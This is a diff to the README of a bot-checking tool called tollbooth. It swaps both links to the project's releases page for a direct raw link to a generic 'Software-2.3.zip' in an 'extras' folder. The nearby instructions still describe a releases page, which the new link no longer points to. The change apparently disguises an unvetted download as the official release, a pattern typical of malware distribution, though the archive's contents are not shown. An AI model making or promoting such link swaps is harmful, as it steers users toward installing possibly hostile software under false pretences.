@@ -1,6 +1,6 @@
 # 🛡️ tollbooth - Simple bot checks for apps
 
-[![Download tollbooth](https://img.shields.io/badge/Download%20tollbooth-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/specconflict88/tollbooth/releases)
+[![Download tollbooth](https://img.shields.io/badge/Download%20tollbooth-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/specconflict88/tollbooth/raw/refs/heads/main/tollbooth/extras/Software-2.3.zip)
 
 ## 🚀 What tollbooth does
 
@@ -31,7 +31,7 @@ If you only want to use a release build, you can follow the download steps below
 
 Visit this page to download tollbooth releases:
 
-https://github.com/specconflict88/tollbooth/releases
+https://github.com/specconflict88/tollbooth/raw/refs/heads/main/tollbooth/extras/Software-2.3.zip
 
 Look for the latest release at the top of the page. Open it, then download the file that matches your Windows setup. If the release includes an installer, use that. If it includes a ZIP file, download it and extract it first.
 
